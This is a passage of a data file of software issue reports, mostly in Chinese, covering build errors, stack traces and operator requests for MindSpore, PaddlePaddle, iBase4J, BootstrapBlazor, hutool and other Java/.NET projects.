SESSION(23986,7fe4477fe700,python):2021-09-10-20:54:55.312.032 [mindspore/ccsrc/backend/session/gpu_session.cc:687] DumpSetup] Start! [INFO] SESSION(23986,7fe4477fe700,python):2021-09-10-20:54:55.312.039 [mindspore/ccsrc/backend/session/gpu_session.cc:690] DumpSetup] Finish! [INFO] SESSION(23986,7fe4477fe700,python):2021-09-10-20:54:55.312.092 [mindspore/ccsrc/backend/session/session_basic.cc:2239] RunGraphImpl] Run graph end, graph id: 11 [INFO] SESSION(23986,7fe4477fe700,python):2021-09-10-20:54:55.312.117 [mindspore/ccsrc/backend/session/executor.cc:143] Run] End run graph 11 ... (Tensor(shape=[], dtype=Float32, value= 0), Tensor(shape=[3, 2], dtype=Float32, value= [[ 3.00000000e+00, 3.00000000e+00], [ 3.00000000e+00, 3.00000000e+00], [ 3.00000000e+00, 3.00000000e+00]]))"
iBase4J 架构研究建议,"将项目跑起来，有一些个人建议，仅供作者与使用者参考~ iBase4J从技术选型来看，是没问题的，流程都一样。 我将源码debug，通读了一下，发现一些问题。 1.作者可能还没从单体应用转换为SOA服务化的思维。 文件：iBase4J-Biz-Web/src/main/resources/Spring-config.xml 中 &lt;dubbo:reference id=""sysProvider"" interface=""org.ibase4j.provider.ISysProvider"" check=""false"" /&gt; &lt;dubbo:reference id=""bizProvider"" interface=""org.ibase4j.provider.IBizProvider"" check=""false"" /&gt; 代码里dubbo的注册服务只有这两个，实际在 dubbo 里有多少个呢？只有一个。 写了篇博客，一些改进建议会追更在博客里面~ 有问题去博客留言啊~ 这里也可以   <code>: provider.execute(new Parameter(""sysUserService"", ""update"").setModel(sysUser)); @Cacheable public Long queryUserIdByThirdParty(ThirdPartyUser param) { return thirdpartyMapper.queryUserIdByThirdParty(param.getProvider(), param.getOpenid()); } public Page&lt;SysUser&gt; query(Map&lt;String, Object&gt; params) { Map&lt;String, String&gt; userTypeMap = sysDicService.queryDicByType(""USERTYPE""); Page&lt;SysUser&gt; pageInfo = super.query(params); for (SysUser userBean : pageInfo.getRecords()) { if (userBean.getUserType() != null) { userBean.setUserTypeText(userTypeMap.get(userBean.getUserType().toString())); } if (userBean.getDeptId() != null) { SysDept sysDept = sysDeptService.queryById(userBean.getDeptId()); if (sysDept != null) { userBean.setDeptName(sysDept.getDeptName()); } } List&lt;String&gt; permissions = sysAuthorizeService.queryUserPermission(userBean.getId()); for (String permission : permissions) { if (StringUtils.isBlank(userBean.getPermission())) { userBean.setPermission(permission); } else { userBean.setPermission(userBean.getPermission() + "";"" + permission); } } } return pageInfo; } public Page&lt;SysUser&gt; query(Map&lt;String, Object&gt; params) { Map&lt;String, String&gt; userTypeMap = sysDicService.queryDicByType(""USERTYPE""); Page&lt;SysUser&gt; pageInfo = super.query(params); for (SysUser userBean : pageInfo.getRecords()) { if (userBean.getUserType() != null) { userBean.setUserTypeText(userTypeMap.get(userBean.getUserType().toString())); } if (userBean.getDeptId() != null) { SysDept sysDept = sysDeptService.queryById(userBean.getDeptId()); if (sysDept != null) { userBean.setDeptName(sysDept.getDeptName()); } } List&lt;String&gt; permissions = sysAuthorizeService.queryUserPermission(userBean.getId()); for (String permission : permissions) { if (StringUtils.isBlank(userBean.getPermission())) { userBean.setPermission(permission); } else { userBean.setPermission(userBean.getPermission() + "";"" + permission); } } } return pageInfo; } String password = (String)CacheUtil.getCache().get(""LOGIN_"" + user.getAccount()); if (StringUtils.isNotBlank(password)) { if (user.getPassword().equals(password)) { WebUtil.saveCurrentUser(request, user.getAccount()); success = true; } } @Transactional @SuppressWarnings(""unchecked"") public T queryById(Long id) { String key = getCacheKey(id); T record = (T) CacheUtil.getCache().get(key); if (record == null) { String lockKey = getLockKey(id); if (CacheUtil.getLock(lockKey)) { try { record = mapper.selectById(id); CacheUtil.getCache().set(key, record); } finally { CacheUtil.unlock(lockKey); } } else { logger.debug(getClass().getSimpleName() + "":"" + id + "" retry queryById.""); sleep(20); return queryById(id); } } return record; } 大量出现 @Transactional @Transactional public void delete(Long id) { try { mapper.deleteById(id); CacheUtil.getCache().del(getCacheKey(id)); } catch (Exception e) { throw new RuntimeException(e.getMessage(), e); } } @Transactional public void del(Long id, Long userId) { try { T record = this.queryById(id); record.setEnable(0); record.setUpdateTime(new Date()); record.setUpdateBy(userId); mapper.updateById(record); CacheUtil.getCache().set(getCacheKey(id), record); } catch (Exception e) { throw new RuntimeException(e.getMessage(), e); } } @Transactional public T update(T record) { try { record.setUpdateTime(new Date()); if (record.getId() == null) { record.setCreateTime(new Date()); mapper.insert(record); } else { T org = this.queryById(record.getId()); String lockKey = getLockKey(record.getId()); if (CacheUtil.getLock(lockKey)) { try { T update = InstanceUtil.getDiff(org, record); update.setId(record.getId()); mapper.updateById(update); record = mapper.selectById(record.getId()); CacheUtil.getCache().set(getCacheKey(record.getId()), record); } finally { CacheUtil.unlock(lockKey); } } else { sleep(20); return update(record); } } } catch (DuplicateKeyException e) { String msg = ExceptionUtil.getStackTraceAsString(e); logger.error(Constants.Exception_Head + msg, e); throw new RuntimeException(""已经存在相同的配置.""); } catch (Exception e) { String msg = ExceptionUtil.getStackTraceAsString(e); logger.error(Constants.Exception_Head + msg, e); throw new RuntimeException(msg); } return record; }"
paddle使用docker编译报找不到PYTHON_LIBRARY 的错误,"你好，我在使用以下步骤： docker pull paddlepaddle/paddle:latest-dev git clone https://github.com/PaddlePaddle/Paddle.git cd Paddle docker run -it -v $PWD:/paddle -e ""WITH_GPU=OFF"" -e ""WITH_TESTING=OFF"" paddlepaddle/paddle_manylinux_devel:cuda8.0_cudnn5 bash -x /paddle/paddle/scripts/docker/build.sh 出错，出错结果如下，我应该如何解决？   <code>: CMake Error: The following variables are used in this project, but they are set to NOTFOUND. Please set them or make sure they are set and tested correctly in the CMake files: PYTHON_LIBRARY (ADVANCED) linked by target ""paddle_pserver_main"" in directory /paddle/paddle/pserver linked by target ""paddle_trainer"" in directory /paddle/paddle/trainer linked by target ""paddle_merge_model"" in directory /paddle/paddle/trainer linked by target ""_swig_paddle"" in directory /paddle/paddle/api"
Can not find libmklml_intel.so in production Docker image,Error logs: I can find the configuration in : I need to execute before .   <code>: root@cb7e1427f88c:/# paddle train /usr/local/bin/paddle_trainer: error while loading shared libraries: libmklml_intel.so: cannot open shared object file: No such file or directory /etc/ld.so.conf.d/libc.conf root@cb7e1427f88c:/# cat /etc/ld.so.conf.d/libc.conf # libc default configuration /usr/local/lib ldconfig paddle train
DateTimePicker在Docker部署下出错,"Blazor Server Side &lt;DateTimePicker TValue=""DateTime"" ViewModel=""DatePickerViewModel.DateTime"" @bind-Value=""DT"" /&gt; @tok_une { private DateTime DT { get; set; } = DateTime.Now; } Docker发布到CentOs 7.8,运行错误。 此前版本一直有这个问题，不敢用这个组件，但这个项目真的很不错，希望能修复这个问题。 [40m[1m[33mwarn[39m[22m[49m: Microsoft.AspNetCore.DataProtection.Repositories.FileSystemXmlRepository[60] Storing keys in a directory '/root/.aspnet/DataProtection-Keys' that may not be persisted outside of the container. Protected data will be unavailable when container is destroyed. [40m[1m[33mwarn[39m[22m[49m: Microsoft.AspNetCore.DataProtection.KeyManagement.XmlKeyManager[35] No XML encryptor configured. Key {177a6236-4a1d-4d75-b653-b5f3fc376867} may be persisted to storage in unencrypted form. [40m[32minfo[39m[22m[49m: Microsoft.Hosting.Lifetime[0] Now listening on: http://0.0.0.0:5009 [40m[32minfo[39m[22m[49m: Microsoft.Hosting.Lifetime[0] Application started. Press Ctrl+C to shut down. [40m[32minfo[39m[22m[49m: Microsoft.Hosting.Lifetime[0] Hosting environment: Production [40m[32minfo[39m[22m[49m: Microsoft.Hosting.Lifetime[0] Content root path: /publish [40m[1m[33mwarn[39m[22m[49m: Microsoft.AspNetCore.HttpsPolicy.HttpsRedirectionMiddleware[3] Failed to determine the https port for redirect. [40m[1m[33mwarn[39m[22m[49m: Microsoft.AspNetCore.Components.Server.Circuits.RemoteRenderer[100] Unhandled exception rendering component: Input string was not in a correct format. System.FormatException: Input string was not in a correct format. at System.Globalization.TimeSpanFormat.FormatCustomized(TimeSpan value, ReadOnlySpan1 format, DateTimeFormatInfo dtfi, StringBuilder result) at System.Globalization.TimeSpanFormat.Format(TimeSpan value, String format, IFormatProvider formatProvider) at System.TimeSpan.ToString(String format) at BootstrapBlazor.Components.DatePickerBody.get_TimeValueString() at BootstrapBlazor.Components.DatePickerBody.BuildRenderTree(RenderTreeBuilder __builder) at Microsoft.AspNetCore.Components.ComponentBase.&lt;.ctor&gt;b__6_0(RenderTreeBuilder builder) at Microsoft.AspNetCore.Components.Rendering.ComponentState.RenderIntoBatch(RenderBatchBuilder batchBuilder, RenderFragment renderFragment) at Microsoft.AspNetCore.Components.RenderTree.Renderer.RenderInExistingBatch(RenderQueueEntry renderQueueEntry) at Microsoft.AspNetCore.Components.RenderTree.Renderer.ProcessRenderQueue() 组件版本 最新，老版本 浏览器 all Server Side   <code>: 1 format, DateTimeFormatInfo dtfi, StringBuilder result) at System.Globalization.TimeSpanFormat.Format(TimeSpan value, String format, IFormatProvider formatProvider) at System.TimeSpan.ToString(String format) at BootstrapBlazor.Components.DatePickerBody.get_TimeValueString() at BootstrapBlazor.Components.DatePickerBody.BuildRenderTree(RenderTreeBuilder __builder) at Microsoft.AspNetCore.Components.ComponentBase.&lt;.ctor&gt;b__6_0(RenderTreeBuilder builder) at Microsoft.AspNetCore.Components.Rendering.ComponentState.RenderIntoBatch(RenderBatchBuilder batchBuilder, RenderFragment renderFragment) at Microsoft.AspNetCore.Components.RenderTree.Renderer.RenderInExistingBatch(RenderQueueEntry renderQueueEntry) at Microsoft.AspNetCore.Components.RenderTree.Renderer.ProcessRenderQueue() [41m[30mfail[39m[22m[49m: Microsoft.AspNetCore.Components.Server.Circuits.CircuitHost[111] Unhandled exception in circuit 'JjM35dgTTbiWDOfN3S2CWhvfZMtEZHIk1bku5WDVmyU'. System.FormatException: Input string was not in a correct format. at System.Globalization.TimeSpanFormat.FormatCustomized(TimeSpan value, ReadOnlySpan"
u-form  里 border-bottom失效,"在 添加 才成功 原因:影响的底部边框的class 定义在而没引用 ""version"": ""1.8.3"" 来源HbuildX插件导入 后续版本请加上   <code>: u-form-item.vue @import ""../../libs/css/style.vue.scss""; u-border-bottom style.vue.scss"
Paddle v1 data reader 数据时间穿越问题,使用的是paddle v1，翻看文档 提到， 。 这个意味着paddle会先将满足train_data_path里的M个文件写到train_list，然后在运行N个结点mpi程序时，每个结点会下载M/N个part。然后每个结点上会同时运行M/N个data_reader。 我现在的需求是，为了避免训练数据的时候时间上出现穿越，想要时间在前的数据先处理，这个有办法实现么？   <code>: PaddlePaddle将train.list中的每一行，都传递给process函数，从而生成多个generator
Modify load() in io.cc for taking into account load_combine op,"This addresses issue #7972:Change the 'mul_op' to 'matmul_op' in fc.. The python side was modified to check for correctness. The python side of is being modified by @kexinzhao as part of #7959:The Infer-shape process can be simplified. The in the current PR is incorrect, but is not useful for the current task. We just need a working version, which is working with the changes in this PR. I have tested the correctness of this PR by saving a model on the python side, and then running the . Another thing that came up while testing and discussing with @kexinzhao offline, is that we need to keep the ordering of params consistent in both python and c++ side for using the new and ops.   <code>: save_vars load_inference_program load_vars save_vars example load_combine save_combine"
paddle-v2版本capi预测时报错求助,"我是通过merge_v2_model(user_net, param_file, output.bin) 方法，把python写的网络(user_net)，产出的模型文件(param_file) 输出到output.bin中。 在c++的预测程序中，我按照python user_net的顺序依次把ivecotr或mat添加到args中： CHECK(paddle_arguments_set_value(in_args, 0, mat)); CHECK(paddle_arguments_set_value(in_args, 1, mat)); CHECK(paddle_arguments_set_value(in_args, 2, mat)); ...... 但是预测的时候报错： 每一维度输入我都做了校验，不会超过网络设计大小，所以应该不会有输入超出的情况： 请问这是什么情况呢？怎么从output.bin文件中查看对应的inputs顺序呢？   <code>: I0730 14:00:27.263100 9886 Util.cpp:166] commandline: --use_gpu=False FeederServer is serving ... F0730 14:00:44.030351 35499 Matrix.cpp:3231] Check failed: index[i] &lt; (int)tableSize (1550723536 vs. 24) *** Check failure stack trace: *** @ 0x7fbeea00a41d google::LogMessage::Fail() @ 0x7fbeea00decc google::LogMessage::SendToLog() @ 0x7fbeea009f43 google::LogMessage::Flush() @ 0x7fbeea00f3de google::LogMessageFatal::~LogMessageFatal() @ 0x7fbeea2f906a paddle::CpuMatrix::selectRowsImp&lt;&gt;() @ 0x7fbeea2f6856 paddle::CpuMatrix::selectRows() @ 0x7fbeea03fdaa paddle::TableProjection::forward() @ 0x7fbeea0a4d59 paddle::MixedLayer::forward() @ 0x7fbeea19d42d paddle::NeuralNetwork::forward() @ 0x7fbeea0062e6 paddle_gradient_machine_forward @ 0xd5fe7f antispam::base::feeder::QBTower::cal_user_qb_vector() @ 0xe07b2e antispam::base::feeder::FeederServiceImpl::proc_recommend_wapqb() @ 0xe158f1 antispam::base::feeder::FeederServiceImpl::handle_http_request() @ 0xe1ab15 antispam::base::feeder::FeederServiceImpl::recommend() @ 0xda90de feeder_rpc::FeederService::CallMethod() @ 0x1264f0f baidu::rpc::policy::ProcessHttpRequest() @ 0x11c497a baidu::rpc::ProcessInputMessage() @ 0x11c5e65 baidu::rpc::InputMessenger::OnNewMessages() @ 0x11f02dd baidu::rpc::Socket::ProcessEvent() @ 0x13321c9 bthread::TaskGroup::task_runner() @ 0x1327861 bthread_make_fcontext Aborted (core dumped)"
[ST][MS/modelzoo][NET][Ascend]caddn][r2.0.0-alpha]日志里面有RuntimeError,"训练日志有报错 / 硬件环境: /device ascend : -- MindSpore version :r2.0.0-alpha commit_id:375750d4 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_model_zoo_unet_train_and_infer_8p.py cd solution_test/remaining\test_scripts\mindspore\net\Unet pytest -s test_ms_model_zoo_unet_train_and_infer_8p.py 网络日志无报错 走给黄辉   <code>: [TRACE] HCCL(8906,python):2022-11-21-16:25:41.976.712 [status:stop] [hcom.cc:264][hccl-8906-0-1669018936-hccl_world_group][0]hcom destroy complete,take time [1110767]us, rankNum[8], rank[0] Exception ignored in: &lt;function Cell.__del__ at 0xffff4ebb8d40&gt; Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 328, in __del__ _cell_graph_executor.del_net_res(self.compile_cache) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1399, in del_net_res self._graph_executor.del_net_res(net_id) RuntimeError: bad_weak_ptr"
[CT][MS]动态shape索引对Tensor([bool])类型报错不明确,"Tensor索引在 索引为Tensor([bool])时报错 不符合预期 后端是ascend / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行用例 passed   <code>: from mindspore import Tensor import pytest import mindspore.nn as nn def test_error(): input_x = Tensor([[1,2,3],[3,4,5]]) x_indice1 =[True,True] x_indice2 = Tensor([True,True]) assert (input_x[x_indice1] == Tensor([[1,2,3],[3,4,5]])).all() with pytest.raises(IndexError) as e: input_x[x_indice2] assert""IndexError: The tensor index must be int type, but got Bool"" class Net(nn.Cell): def __init__(self): super().__init__() self.index = Tensor([True, True]) def construct(self, x): x[self.index] = 2 return output out = Net()(input_x) valueError: The tensor(shape=(2, 3)) and tensor index(shape=(2,)) should be the same shape."
配置菜单以后一直报错404,"修改urlPath为动态的 @Derek.li public class SysPageController { }   <code>: protected Logger logger = LoggerFactory.getLogger(getClass()); @RequestMapping(""{urlPath}/{url}.html"") public String page(@PathVariable(""url"") String url,@PathVariable(""urlPath"") String urlPath){ logger.info(""模块路径------{}"",urlPath); return urlPath +""/""+ url + "".html""; }"
【众智】【计算-AICPU开发】FractionalMaxPool3DWithFixedKsize,AICPU算子接入 3D分数最大池化。 接口目录：mindspore/ops/operations/nn_ops.py input_x random_samples y argmax 可选输出 用于反向梯度算子的输入 ksize list_float 属性 output_shape list_int 属性 data_format string 属性 对应底层算子 对应底层AICPU算子FractionalMaxPool3DWithFixedKsize 反向接入FractionalMaxPool3DGradWithFixedKsize。   <code>: class FractionalMaxPool3DWithFixedKsize(Primitive):
代码生成器生成的service没有覆盖父类get方法，父类get方法第一个参数（主键）默认是String，如果数据表里主键字段是16位数字，系统会提示出错，请问怎么处理,"代码生成器生成的service没有覆盖父类get方法，父类get方法第一个参数（主键）默认是String，如果数据表里主键字段是16位数字，系统会提示出错，请问怎么处理 这儿出错 Error:(42, 44) java: 不兼容的类型: java.lang.Long无法转换为java.lang.String   <code>: @ModelAttribute public Customer get(Long customerId, boolean isNewRecord) { return customerService.get(customerId , isNewRecord); }"
[CT][MS] 算子sparsesparseMaximun cpu 输入shape不同 未报错,"算子支持cpu 和ascend 对输入 x1.shape= (3,3) x2.shape=(3,4) ascend 报错Call runtime rtStreamSynchronize failed. Op name: Default/SparseSparseMaximum-op0 cpu pass cpu 标杆tensorflow 报错不支持 算子SparseSparseMinimum 报错ValueError: For SparseSparseMinimum, operands' shapes do not match / 硬件环境: /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行用例 报错 passed   <code>: def test_sparsesparsemaximum_shape_different_error(): x1_indice = Tensor([[0, 0]], dtype=mstype.int64) x1_value = Tensor([1], dtype=mstype.int64) x1_shape = Tensor([3, 3], dtype=mstype.int64) x2_indice = Tensor([[1, 3]], dtype=mstype.int64) x2_value = Tensor([100], dtype=mstype.int64) x2_shape = Tensor([3, 4], dtype=mstype.int64) input_list = [x1_indice, x1_value, x1_shape, x2_indice, x2_value, x2_shape] fact = SparseSparseMaximumMock(inputs=input_list) &gt; out = fact.forward_mindspore_impl()"
Remove template parameter `functor1` of `ElementwiseGradCompute`,The template parameter of is no longer be used. We can remove it. https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/operators/elementwise_op_function.h#L313-L359   <code>: functor1 ElementwiseGradCompute
【众智】【计算-GPU开发】Lerp,线性插值：它根据数据序列中需要插值的点的左右临近两个数据来进行数值估计。当然它不是求这两个点数据大小的平均值（在中心点的时候就等于平均值）。而是根据到这两个点的距离来分配比重的，如图： 参考 https://github.com/pytorch/pytorch/blob/v1.8.1/tools/autograd/derivatives.yaml 中 lerp 的反向算子   <code>: class Lerp(Primitive):
"[CT][MS][parallel]sparse gatherv2, raise error:Can not find .json file",": /device ascend : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_semi_auto_parallel_multifieldembeddinglookup_device_sparse_table_row_slice_sum cd /home/wys/code/MindSporeTest/parallel/operator ../../share/parallel/tool/pytest_parallel.sh -r /root/mindspore/hccl/hccl_8p.json -s 8 -b 0 -e 7 -f test_parallel_multifieldembeddinglookup.py -t test_semi_auto_parallel_multifieldembeddinglookup_device_sparse_table_row_slice_sum sparse gatherv2, raise error:Can not find .json file case pass l1 size. -1, taskID[0.5157] [INFO] TBE(83853,python3.7):2021-08-24-15:36:26.465.482 [../../../../../../../../../../root/archiconda3/envs/wys/lib/python3.7/site-packages/te_fusion/parallel_compilation.py:1240][loop] taskID[0.5157] has been added to fin_task_queue,finished [INFO] KERNEL(83409,ffff3bfff160,python3.7):2021-08-24-15:36:26.804.328 [mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_utils.cc:206] InsertCache] kernel name: gather_v2_12583023866798111199_0, processr:aicore [INFO] KERNEL(83409,ffff3bfff160,python3.7):2021-08-24-15:36:26.804.482 [mindspore/ccsrc/backend/kernel_compiler/kash/kernel_pack.cc:207] LoadKernelMeta] Open json file: ./rank_0/kernel_meta/gather_v2_12583023866798111199_0.json error, please check kernel_meta. [INFO] KERNEL(83409,ffff3bfff160,python3.7):2021-08-24-15:36:26.804.503 [mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_utils.cc:471] GetKernelPack] Read cache json and bin file failed[./rank_0/kernel_meta/gather_v2_12583023866798111199_0.json] [ERROR] KERNEL(83409,ffff3bfff160,python3.7):2021-08-24-15:36:26.804.525 [mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_parallel_build.cc:178] TaskFinishProcess] Can not find .json file or the binary .o file for op gather_v2_12583023866798111199_0, go check the cache files in kernel_meta/ [INFO] DEBUG(83409,ffff3bfff160,python3.7):2021-08-24-15:36:26.804.549 [mindspore/ccsrc/debug/trace.cc:120] TraceGraphEval] Length of analysis graph stack is empty. [INFO] DEBUG(83409,ffff3bfff160,python3.7):2021-08-24-15:36:26.804.560 [mindspore/ccsrc/debug/trace.cc:424] GetEvalStackInfo] Get graph analysis information begin [INFO] DEBUG(83409,ffff3bfff160,python3.7):2021-08-24-15:36:26.804.570 [mindspore/ccsrc/debug/trace.cc:427] GetEvalStackInfo] Length of analysis information stack is empty. [EVENT] TDT(83409,python3.7):2021-08-24-15:36:26.970.577 [log.cpp:147]""HostSendPool: {blockSize: 3072K, totalNum: 4, freeNum: 4}"" ""HostRecvPool: {blockSize: 3072K, totalNum: 1, freeNum: 1}"" ""DeviceRecvPool: "" ""HostCtrlPool: {SendPool: 4, FreePool: 4}, {RecvPool: 1, FreePool: 1}"",[memory_pool.cpp:682:GetHostPoolStatus]83613 [EVENT] TDT(83409,python3.7):2021-08-24-15:36:27.970.763 [log.cpp:147]""HostSendPool: {blockSize: 3072K, totalNum: 4, freeNum: 4}"" ""HostRecvPool: {blockSize: 3072K, totalNum: 1, freeNum: 1}"" ""DeviceRecvPool: "" ""HostCtrlPool: {SendPool: 4, FreePool: 4}, {RecvPool: 1, FreePool: 1}"",[memory_pool.cpp:682:GetHostPoolStatus]83613 F self = &lt;mindspore.common.api._Executor object at 0xffff823ce990&gt; obj = TrainOneStepCell&lt; (network): _VirtualDatasetCell&lt; (_backbone): ParallelMultiFieldEmbeddingLookupNet&lt; (em): MultiFieldEmbeddingLookup&lt;&gt; &gt; &gt; (optimizer): Adam&lt;&gt; phase = '1train.1629790534218732544.281472097279824', do_convert = True auto_parallel_mode = True args = (Tensor(shape=[8, 50], dtype=Float32, value= [[ 1.76405239e+00, 4.00157213e-01, 9.78738010e-01 ... 7.77490377e-01, ...000e+00], [ 0.00000000e+00, 1.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00]])) E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/tbe/tbe_kernel_parallel_build.cc:178 TaskFinishProcess] Can not find .json file or the binary .o file for op gather_v2_12583023866798111199_0, go check the cache files in kernel_meta/ E E # /root/archiconda3/envs/wys/lib/python3.7/site-packages/mindspore/common/api.py:536: RuntimeError   <code>: ''' TEST_SUMMARY: test operator MultiFieldEmbeddingLookup in semi auto parallel mode with 8p target='DEVICE', slice_mode='table_row_slice', sparse=True, operator='SUM' ''' def test_semi_auto_parallel_multifieldembeddinglookup_device_sparse_table_row_slice_sum(): input_np = 10 * np.random.randn(64, 50).astype(np.float32) label = 10 * np.random.randn(64, 50).astype(np.float32) standalone_dataset = FakeData(size=64, batch_size=64, image_size=(50, )) fact = ParallelMultiFieldEmbeddingLookupFactory(target='DEVICE', indices_shape=(64, 50), field_shape=(64, 50), slice_mode='table_row_slice', sparse=True, operator='SUM') fact.mindspore_standalone_impl(dataset=standalone_dataset, epoch=2) parallel_dataset = FakeData(size=64, batch_size=8, image_size=(50, ), use_parallel=True) fact.mindspore_semi_parallel_impl(dataset=parallel_dataset, epoch=2, device_num=8) fact.checkpoint_cmp(input_np=input_np, label=label) def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" args_names, args_list = _generate_pip_args(obj, *args) dic = dict(zip(args_names, args_list)) key = generate_key(phase, dic) obj.phase_prefix = str(key[1]) if 'export' in phase: phase = phase + '.' + obj.phase_prefix + '.' + str(obj.create_time) + '.' + str(id(obj)) else: phase = obj.phase_prefix + phase + '.' + str(obj.create_time) + '.' + str(id(obj)) if phase in self.compile_cache.keys(): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_full = _to_full_tensor(args, _get_device_num(), _get_global_rank()) _, args_list = _generate_pip_args(obj, *args_full) enable_debug_runtime = context.get_context(""enable_debug_runtime"") enable_ge = context.get_context(""enable_ge"") use_vm = not enable_ge or (enable_debug_runtime and context.get_context(""mode"") == context.PYNATIVE_MODE) result = self._executor.compile(obj, args_list, phase, use_vm, self.queue_name)"
国密sm2 5.2.0及以后版本无法加密解密,"JDK版本： jdk1.8.0_102 hutool版本： 5.2.0到5.5.0 国密算法加密解密报错 Exception in thread ""main"" java.lang.NoSuchMethodError: org.bouncycastle.crypto.engines.SM2Engine.(Lorg/bouncycastle/crypto/Digest;Lorg/bouncycastle/crypto/engines/SM2Engine$Mode;)V at cn.hutool.crypto.asymmetric.SM2.getEngine(SM2.java:502) at cn.hutool.crypto.asymmetric.SM2.encrypt(SM2.java:214) at cn.hutool.crypto.asymmetric.SM2.encrypt(SM2.java:194) at cn.hutool.crypto.asymmetric.AbstractAsymmetricCrypto.encrypt(AbstractAsymmetricCrypto.java:97) at cn.hutool.crypto.asymmetric.AbstractAsymmetricCrypto.encryptBcd(AbstractAsymmetricCrypto.java:219) at cn.hutool.crypto.asymmetric.AbstractAsymmetricCrypto.encryptBcd(AbstractAsymmetricCrypto.java:206) at test.main(test.java:16) cn.hutool hutool-all 5.1.5 org.bouncycastle bcprov-jdk15to18 1.66 bc库 1.66 和 1.67都引过   <code>: String text = ""我是一段测试aaaa""; SM2 sm2 = SmUtil.sm2(); // 公钥加密，私钥解密 String encryptStr = sm2.encryptBcd(text, KeyType.PublicKey); String decryptStr = StrUtil.utf8Str(sm2.decryptFromBcd(encryptStr, KeyType.PrivateKey)); System.out.println(encryptStr); System.out.println(decryptStr);"
【众智】【计算-AICPU开发】InplaceIndexAdd,"AICPU算子适配 + functional接口 + CPU算子迁移 + 算子反向 根据索引indices和axis指定的位置，将updates相加更新到var上 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py var indices updates axis int 属性 var 对应底层算子 对应底层AI CPU算子InplaceIndexAdd PyTorch1.8.1接口： torch.Tensor.index_add_ https://pytorch.org/docs/stable/generated/torch.Tensor.index_add_.html?highlight=index_add_#torch.Tensor.index_add_ 3. 异常处理 4. 算子反向 tools\autograd\derivatives.yaml   <code>: def inplace_index_add(var: tensor, indices: tensor, updates: tensor, axis: int) -&gt; tensor: return var class InplaceIndexAdd(Primitive): REG_OP(InplaceIndexAdd) .INPUT(var, TensorType({DT_INT16, DT_INT32, DT_INT8, DT_UINT8, DT_FLOAT32, DT_FLOAT16, DT_DOUBLE})) .INPUT(indices, TensorType({DT_INT32})) .INPUT(updates, TensorType({DT_INT16, DT_INT32, DT_INT8, DT_UINT8, DT_FLOAT32, DT_FLOAT16, DT_DOUBLE})) .OUTPUT(var, TensorType({DT_INT16, DT_INT32, DT_INT8, DT_UINT8, DT_FLOAT32, DT_FLOAT16, DT_DOUBLE})) .REQUIRED_ATTR(axis, Int) .OP_END_FACTORY_REG(InplaceIndexAdd) - name: index_add_(Tensor(a!) self, int dim, Tensor index, Tensor source) -&gt; Tensor(a!) self: grad source: grad.index_select(dim, index).expand_as(source) index: non_differentiable"
[问题] 关于种子数据接口IEntitySeedData<>.HasData的返回类型,"Furion 版本号 3.0.5 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 在生成种子数据时，令方法直接返回类型的数据，会报异常并提示无法转换为: ToList后再返回可以解决，不过底层逻辑是否应该考虑到返回类型时的情况？ 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: HasData IEnumerable&lt;&gt; IList public class CargoType : Entity { public string Name { get; set; } } public class CargoTypeSeedData : IEntitySeedData&lt;CargoType&gt; { static readonly string[] SeedData = new string[] { ""Gp20"",""Ot20"",""Fr20"",""Gp40"",""Hq40"",""Ot40"",""Fr40"",""Ft45"", }; public IEnumerable&lt;CargoType&gt; HasData(DbContext dbContext, Type dbContextLocator) =&gt; SeedData.Select((name, i) =&gt; new CargoType { Id = i + 1, Name = name }); } IEnumerable&lt;&gt; System.InvalidCastException:“Unable to cast object of type '&lt;SelectIterator&gt;d__199`2[System.String,CargoType]' to type 'System.Collections.IList'.”"
对象内部映射查询,"如何解决对象内部的映射查询 现在是调用 getById() 会把 material 这个对象当作数据库字段进行查询，报Unknow column 'material' ,通过什么方式能够实现映射查询？   <code>: &lt;resultMap id=""BaseResultMap"" type=""org.springblade.wms.entity.businessEntity.RkSub""&gt; &lt;id column=""id"" jdbcType=""INTEGER"" property=""id"" /&gt; &lt;result column=""material_id"" jdbcType=""INTEGER"" property=""materialId"" /&gt; &lt;association property=""material"" column=""material_id"" select=""org.springblade.wms.mapper.MaterialMapper.selectByPrimaryKey""/&gt; &lt;/resultMap&gt; public class RkSub extends BaseEntity implements Serializable { private Integer id; private Integer materialId; private Material material; }"
